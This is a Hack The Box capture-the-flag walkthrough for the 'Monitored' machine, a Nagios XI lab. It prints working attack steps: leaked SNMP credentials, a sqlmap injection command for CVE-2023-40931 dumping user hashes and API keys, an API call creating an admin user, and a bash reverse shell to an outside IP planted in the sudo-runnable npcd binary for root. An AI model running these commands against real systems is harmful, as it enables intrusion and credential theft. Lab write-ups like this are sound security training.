---
title: HTB - Monitored
date: 2024-05-11 00:00:00 + 1000
categories: [CTF,HTB,Web App]
tags: [cve-2023-40931,SQL Injection,htb,RCE]
comments: false
---

Monitored is Hack The Box medium-rated machine. Sharing a walkthrough based on notes I took back in January, while it might not be perfect but I hope they're still useful.

## Common Enumeration

Running the `namp` found the five open ports as following:

- 22 - SSH
- 80 - HTTP
- 389 - LDAP
- 443 - HTTPS
- 5667 - unknown

```bash

$ nmap -p- --min-rate 5000 -oA recon/allPort 10.10.11.248
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-17 19:19 AEDT
Nmap scan report for 10.10.11.248
Host is up (0.0056s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
443/tcp  open  https
5667/tcp open  unknown


$ nmap -p 22,80,389,443,5667 -sC -sV -oA recon/TPort 10.10.11.248
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-17 19:20 AEDT
Nmap scan report for 10.10.11.248
Host is up (0.0066s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

It redirected to `nagios.monitored.htb`, so I added to my `/etc/hosts` file:

```bash
10.10.11.248    nagios.monitored.htb monitored.htb
```

### Directory / Subdomain Brute forcing

- Gobuster didn't find anything useful

```bash
$ gobuster dir -u https://monitored.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k -b 404,403

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 321] [--> https://monitored.htb/javascript/]
/.                    (Status: 200) [Size: 3245]
/nagios               (Status: 401) [Size: 461]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

- FFUF found the `nagios` subdomain

```bash
$ ffuf -u http://10.10.11.248 -H "Host: FUZZ.monitored.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac -k

nagios                  [Status: 302, Size: 298, Words: 18, Lines: 10, Duration: 4ms]
:: Progress: [4989/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

### Browsing Website

Navigating to `https://nagios.monitored.htb/` led to the Nagios XI page.

![img](/assets/img/Monitored/img1.webp)

Clicking on “Access Nagios XI” brought up the login page.

![img](/assets/img/Monitored/img2.webp)

Without credentials, I attempted to brute-forcing and SQL injection with no success

### UDP Scanning

I went back and ran the UDP scanning and found two open ports:

- 123 - NTP
- 161 -SNMP

```bash
$ nmap -sU -p- --min-rate 5000 -oA recon/udp --open 10.10.11.248
Warning: 10.10.11.248 giving up on port because retransmission cap hit (10).
Nmap scan report for nagios.monitored.htb (10.10.11.248)
Host is up (0.0054s latency).
Not shown: 65386 open|filtered udp ports (no-response), 147 closed udp ports (port-unreach)
PORT    STATE SERVICE
123/udp open  ntp
161/udp open  snmp
```

### Checking SNMP on UDP 161

Using `snmpwalk`, I output the results to a file `snmp`

```bash
$ snmpwalk -c public -v2c 10.10.11.248 > snmp
```

I did not know what I am looking for so, scroll through and found those credential. Seems like it's running script `/opt/scripts/check_host.sh` with the credential `svc XjH7VCehowpR1xZB` 

```bash
iso.3.6.1.2.1.25.4.2.1.5.902 = ""
iso.3.6.1.2.1.25.4.2.1.5.903 = ""
iso.3.6.1.2.1.25.4.2.1.5.950 = ""
iso.3.6.1.2.1.25.4.2.1.5.959 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.960 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
iso.3.6.1.2.1.25.4.2.1.5.961 = STRING: "/usr/sbin/snmptt --daemon"
iso.3.6.1.2.1.25.4.2.1.5.986 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.987 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.988 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.989 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.990 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
iso.3.6.1.2.1.25.4.2.1.5.1377 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
iso.3.6.1.2.1.25.4.2.1.5.1418 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1420 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
iso.3.6.1.2.1.25.4.2.1.5.1498 = STRING: "-bd -q30m"
iso.3.6.1.2.1.25.4.2.1.5.2486 = ""
iso.3.6.1.2.1.25.4.2.1.5.2823 = ""

...snip....
```

Using these credential to log in at `/nagiosxi/login.php` displayed in an error: "The specified user account has been disabled or does not exist."

![img](/assets/img/Monitored/img4.webp)

### Directory Brute forcing

- Running another Gobuster scan and it found the following directory

```bash
$ gobuster dir -u https://nagios.monitored.htb/nagiosxi/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k
 -b 404,403                                                                                                                              

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 342] [--> https://nagios.monitored.htb/nagiosxi/includes/]
/images               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/images/]
/admin                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/admin/]
/account              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/account/]
/config               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/config/]
/help                 (Status: 301) [Size: 338] [--> https://nagios.monitored.htb/nagiosxi/help/]
/api                  (Status: 301) [Size: 337] [--> https://nagios.monitored.htb/nagiosxi/api/]
/db                   (Status: 301) [Size: 336] [--> https://nagios.monitored.htb/nagiosxi/db/]
/about                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/about/]
/tools                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/tools/]
/mobile               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/mobile/]
/reports              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/reports/]
/.                    (Status: 302) [Size: 27] [--> https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1]
/backend              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/backend/]
/views                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/views/]
/terminal             (Status: 200) [Size: 5215]
/dashboards           (Status: 301) [Size: 344] [--> https://nagios.monitored.htb/nagiosxi/dashboards/]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================

```

Attempting the credentials on `/terminal` and `/api` was unsuccessful, with `/api` being forbidden. I ran the Gobuster against `/api/` found `/v1`, but it didn't lead anywhere.

![img](/assets/img/Monitored/img5.webp)

```bash
$ gobuster dir -u https://nagios.monitored.htb/nagiosxi/api -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -k -b 404,403

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/includes             (Status: 301) [Size: 346] [--> https://nagios.monitored.htb/nagiosxi/api/includes/]
/v1                   (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/api/v1/]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

- FFUF found the `v1/authenticate`.

```bash
 ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt  -mc all -ac -k

license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 418ms]
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 763ms]
:: Progress: [43007/43007] :: Job [1/1] :: 39 req/sec :: Duration: [0:20:27] :: Errors: 0 ::
```

### Authentication Token

- Browsing the `v1/authenticate` displayed this error

![img](/assets/img/Monitored/img6.webp)

#### Changing Request Method (Burp Suite):

- Changed the request method from `GET` to `POST`
- Passed the username and password
- The server responded with an `auth_token` valid for 5 minutes
- After I got the auth_token, I wrote a Python script to get the `auth_token` 

```bash
$ python3 auth_token.py 
Authentication successful. 
Auth Token: 30d1408f19e70d6729338062552988b486ec5051
```

Googling for "nagiosxi api", I came across [this page](https://www.nagios.org/ncpa/help/2.2/api.html) - Based on the documentation, I use the token parameter directly in the URL at the Nagios XI login page.

```bash
https://nagios.monitored.htb/nagiosxi/?token=b1aa74600d98200a5c3a59b710a48672d9964816
```

### Enumerating Nagiosxi

I was able to log in as `svc`, and found that the Nagiosxi is running version `5.11.0`.

![img](/assets/img/Monitored/img7.webp)

I found an API Key associated with the `svc` user. The API Key - `2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK`

![img](/assets/img/Monitored/img8.webp)

Other than the API Key, there was no other useful info
#### CVE-2023-40931 - SQL injection

I googled the `Nagios xi 5.11.0` and found that this version is vulnerable to SQL injection - CVE-2023-40931. I ran the `sqlmap` to to dump the data

```bash
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&action=acknowledge_banner_message" -p id --cookie "nagiosxi=9cknprbi1ggfngnrfgqh5nceg1" --batch -D nagiosxi -T xi_users --dump
```

There is another user `nagiosadmin`

| email               | name                 | username    | api_key                                                          | password                                                     |
| ------------------- | -------------------- | ----------- | ---------------------------------------------------------------- | ------------------------------------------------------------ |
| admin@monitored.htb | Nagios Administrator | nagiosadmin | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C |
| svc@monitored.htb   | svc                  | svc         | QRjkNm4avVpb65bQsZo9PlVqXCvlsFJDKfLmXc5WKIdA6iB6WIiG34HvYl2mTbWn | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK |

I try to crack the passwords for both `nagiosadmin` and `svc` but unsuccessful

## Creating Admin User

I was not able to do much with `svc` account and was unable to crack the password for the `nagiosadmin` user. After some quick Googling, I came to [this page](https://support.nagios.com/forum/viewtopic.php?f=6&t=40502) Nagios support forum

![img](/assets/img/Monitored/img9.webp)

Based on the info from this post; seems like the admin user can be created by passing those parameters `username`, `password`, `name`, `email`, and `auth_level` via the API. I use the following command to create an admin user

```bash
$ curl -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL" -d "username=z3r0da&password=z3r0da&name=ctf&email=z3r0da@monitored.htb&auth_level=admin" -k -s
{"success":"User account z3r0da was added successfully!","user_id":7}
```

User account `z3r0da` was added successfully! and I am able login to `https://nagios.monitored.htb/nagiosxi/` with `z3r0da`

![img](/assets/img/Monitored/img10.webp)

After I checked the "I have read, understood, and agree to be bound by the terms of the license above" box and submitted. I was required to change the password

![img](/assets/img/Monitored/img11.webp)

I was redirected to the Nagios XI dashboard.

![img](/assets/img/Monitored/img12.webp)

## Shell as nagios

Exploring the dashboard, I found the "Core Config Manager" which is interesting... potential for executing commands

![img](/assets/img/Monitored/img13.webp)

I navigated to the Core Config Manager section

![img](/assets/img/Monitored/img14.webp)

I added a reverse shell, and save but nothing happened initially

![img](/assets/img/Monitored/img15.webp)

Returning to the Core Config and selected the "localhost". Under the "Check command" dropdown for the localhost, I selected the `rev_shell` command

![img](/assets/img/Monitored/img16.webp)

The `rev_shell` command was executed, I got the shell as `nagios`

```bash
$ nc -lvnp 1337
nagios@monitored:/tmp$ 
```

#### Upgrading shell

I upgraded my shell using Python to make it more stable

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Got the `user.txt` flag

```bash
nagios@monitored:~$ ls
cookie.txt  user.txt
nagios@monitored:~$ cat user.txt 
afdb64ea************************
nagios@monitored:~$ 
```

## Privilege Escalation

Running `sudo -l` showed that the `nagios` user can execute the following as root

```bash
agios@monitored:~$ sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```

A quick bit of googling I found [this page](https://www.tenable.com/security/research/tra-2020-61) following the PoC 

- Stop the npcd service

```bash  
sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
```

- Modified the npcd `vim /usr/local/nagios/bin/npcd` to add the reverse shell

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.27/1337 0>&1
```

- Made the `npcd` executable

```bash
chmod +x /usr/local/nagios/bin/npcd
```

- I opened netcat listener and started the `npcd` service

```bash
sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd
```

### Root.txt

Finally, escalated to root and got the `root.txt` flag

```bash
$ nc -lvnp 1337
root@monitored:/# whoami
whoami
root
root@monitored:/# cat /root/root.txt
cat /root/root.txt
6e2412a*************************
root@monitored:/# 
```
